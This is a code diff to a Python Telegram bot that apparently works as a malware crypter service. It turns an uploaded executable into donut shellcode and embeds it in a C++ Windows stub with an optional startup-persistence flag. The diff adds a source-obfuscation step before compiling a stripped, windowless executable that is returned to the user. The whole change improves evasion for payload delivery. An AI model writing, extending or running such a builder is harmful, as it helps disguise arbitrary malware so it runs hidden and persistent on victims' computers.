@@ -9,6 +9,7 @@ import warnings
 from telegram.warnings import PTBUserWarning
 import pytz
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
+from utils.obf import run_obfuscation
 from telegram.ext import (
     Application,
     CommandHandler,
@@ -365,7 +366,7 @@ async def get_filename(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     return GET_STARTUP_CHOICE
 
 async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Stores startup choice, compiles with the new stub, sends, and cleans."""
+    """Stores startup choice, obfuscates, compiles, sends, and cleans."""
     query = update.callback_query
     await query.answer()
 
@@ -382,13 +383,13 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
     uid = query.from_user.id
     udir = user_stub_dir(uid)
     cpp_file_path = os.path.join(udir, f"source_{uid}.cpp")
+    obfuscated_cpp_path = os.path.join(udir, f"obfuscated_{uid}.cpp")
     compiled_exe_path = os.path.join(udir, f"compiled_{uid}.exe")
 
     try:
         await edit_message(query, "Processing your file... This may take a moment.", None)
 
         shellcode_bytes = donut.create(file=input_path)
-        # Format shellcode as a C-style hex string
         shellcode_hex = "".join([f"\\x{b:02x}" for b in shellcode_bytes])
 
         startup_macro = "#define StartUP true" if startup else "#define StartUP false"
@@ -528,18 +529,27 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         with open(cpp_file_path, "w", encoding="utf-8") as f:
             f.write(cpp_template)
 
+        # Obfuscate the C++ file
+        try:
+            await edit_message(query, "Obfuscating source code...", None)
+            run_obfuscation(cpp_file_path, obfuscated_cpp_path)
+        except Exception as e:
+            await edit_message(query, f"An error occurred during obfuscation: {e}", None)
+            return ConversationHandler.END
+
+        # Compile the obfuscated C++ file
+        await edit_message(query, "Compiling your file...", None)
         compile_result = subprocess.run(
-            ["g++", cpp_file_path, "-o", compiled_exe_path, "-mwindows", "-s", "-w"],
+            ["g++", obfuscated_cpp_path, "-o", compiled_exe_path, "-mwindows", "-s", "-w", "-lshlwapi"],
             capture_output=True, text=True,
         )
 
         if compile_result.returncode != 0:
-            error_msg = f"Compilation Error:\\n{compile_result.stderr}"
-            print(f"Compilation failed for user {uid}:\\n{error_msg}")
+            error_msg = f"Compilation Error:\n{compile_result.stderr}"
+            print(f"Compilation failed for user {uid}:\n{error_msg}")
 
-            # Truncate for Telegram
             if len(error_msg) > 4000:
-                error_msg = error_msg[:4000] + "\\n...(truncated)"
+                error_msg = error_msg[:4000] + "\n...(truncated)"
 
             await edit_message(query, error_msg, None)
             return ConversationHandler.END
@@ -557,9 +567,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         await edit_message(query, f"An unexpected error occurred: {e}", None)
 
     finally:
-        for path in [input_path, cpp_file_path, compiled_exe_path]:
+        # Clean up all temporary files
+        for path in [input_path, cpp_file_path, obfuscated_cpp_path, compiled_exe_path]:
             if path and os.path.exists(path):
-                os.remove(aa) #path
+                os.remove(path)
         context.user_data.clear()
 
     return ConversationHandler.END
